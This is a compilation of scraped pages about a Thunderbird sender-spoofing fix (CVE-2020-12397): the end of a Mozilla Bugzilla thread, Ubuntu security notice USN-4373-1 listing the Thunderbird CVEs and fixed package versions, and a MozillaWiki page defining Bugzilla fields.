[bug1617370](/show_bug.cgi?id=1617370 "RESOLVED FIXED - Sender Email Address Spoofing by encoded extraneous white space in display name")\_spoof\_white\_encoded.patch
Good in beta, so approved for ESR
[Attachment #9138509](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: approval-comm-esr68? → approval-comm-esr68+

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1617370#c20)• 5 years ago |
|  | |

Should this bug get marked as resolved?

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1617370#c21)• 5 years ago |
|  | |

Yes.

Status: ASSIGNED → RESOLVEDClosed: 5 years agoResolution: --- → FIXED

|  | [Rob Lemley [:rjl]](/user_profile?user_id=63411) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1617370#c22)• 5 years ago |
|  | |

Thunderbird 68.8.0:

<https://hg.mozilla.org/releases/comm-esr68/rev/4ca5075cd516bdff172466a7e625888882a41821>

<https://hg.mozilla.org/releases/comm-esr68/rev/0abd6e4e477e3ad0eaedd97d8a6e469d786b8ded>

[status-thunderbird\_esr68](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=equals&v1=fixed)

|  | [Kai Engert [:KaiE:]](/user_profile?user_id=36541) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1617370#c23)• 5 years ago |
|  | |

Magnus, who should get attributed as the reporter of this issue?

Flags: needinfo?(mkmelin+mozilla)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1617370#c24)• 5 years ago |
|  | |

I think the reporter of [bug 1506587](/show_bug.cgi?id=1506587 "RESOLVED FIXED - Sender Email Address Spoofing by extraneous white space in display name"). See [bug 1506587 comment 67](/show_bug.cgi?id=1506587#c67 "RESOLVED FIXED - Sender Email Address Spoofing by extraneous white space in display name").

Flags: needinfo?(mkmelin+mozilla)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1617370#a6214407_428608)• 5 years ago |

Alias: CVE-2020-12397

|  | [0xsobky](/user_profile?user_id=619047) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1617370#c25)• 5 years ago |
|  | |

(In reply to Kai Engert (:KaiE:) from [comment #23](/show_bug.cgi?id=1617370#c23 "RESOLVED FIXED - Sender Email Address Spoofing by encoded extraneous white space in display name"))

> Magnus, who should get attributed as the reporter of this issue?

If you need a name for the security advisory, please use "Ahmed Elsobky (@0xSobky)". Thanks!

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1617370#a8138853_1689)• 5 years ago |

Group: mail-core-security → core-security-release

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1617370#c26)• 5 years ago |
|  | |

Comment on [attachment 9138509](/attachment.cgi?id=9138509 "bug1617370_spoof_white_encoded.patch") [[details]](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") [[diff]](/attachment.cgi?id=9138509&action=diff "bug1617370_spoof_white_encoded.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1617370&attachment=9138509)
[bug1617370](/show_bug.cgi?id=1617370 "RESOLVED FIXED - Sender Email Address Spoofing by encoded extraneous white space in display name")\_spoof\_white\_encoded.patch
Beta uplift wasn't processed.
[Attachment #9138509](/attachment.cgi?id=9138509&action=edit "bug1617370_spoof_white_encoded.patch") -
Flags: approval-comm-beta+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1617370#a14533592_1689)• 4 years ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1617370&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from usn.ubuntu.com_80859124_20250119_122716.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4373-1: Thunderbird vulnerabilities

26 May 2020

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 20.04 LTS](/security/notices?release=focal)
* [Ubuntu 19.10](/security/notices?release=eoan)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

or execute arbitrary code. ([CVE-2020-6831](/security/CVE-2020-6831), [CVE-2020-12387](/security/CVE-2020-12387), [CVE-2020-12395](/security/CVE-2020-12395))

It was discovered that the Devtools’ ‘Copy as cURL’ feature did not

properly escape the HTTP POST data of a request. If a user were tricked

in to using the ‘Copy as cURL’ feature to copy and paste a command with

specially crafted data in to a terminal, an attacker could potentially

exploit this to obtain sensitive information from local files.

([CVE-2020-12392](/security/CVE-2020-12392))

It was discovered that Thunderbird did not correctly handle Unicode

whitespace characters within the From email header. An attacker could

potentially exploit this to spoof the sender email address that

Thunderbird displays. ([CVE-2020-12397](/security/CVE-2020-12397))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 20.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.8.0+build2-0ubuntu0.20.04.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.8.0%2Bbuild2-0ubuntu0.20.04.2)

##### Ubuntu 19.10

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.8.0+build2-0ubuntu0.19.10.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.8.0%2Bbuild2-0ubuntu0.19.10.2)

##### Ubuntu 18.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.8.0+build2-0ubuntu0.18.04.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.8.0%2Bbuild2-0ubuntu0.18.04.2)

##### Ubuntu 16.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.8.0+build2-0ubuntu0.16.04.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.8.0%2Bbuild2-0ubuntu0.16.04.2)

After a standard system update you need to restart Thunderbird to make

all the necessary changes.

## References

* [CVE-2020-6831](/security/CVE-2020-6831)
* [CVE-2020-12387](/security/CVE-2020-12387)
* [CVE-2020-12392](/security/CVE-2020-12392)
* [CVE-2020-12395](/security/CVE-2020-12395)
* [CVE-2020-12397](/security/CVE-2020-12397)

## Related notices

* [USN-4353-1](/security/notices/USN-4353-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from wiki.mozilla.org_73f8d6fa_20250119_140529.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)


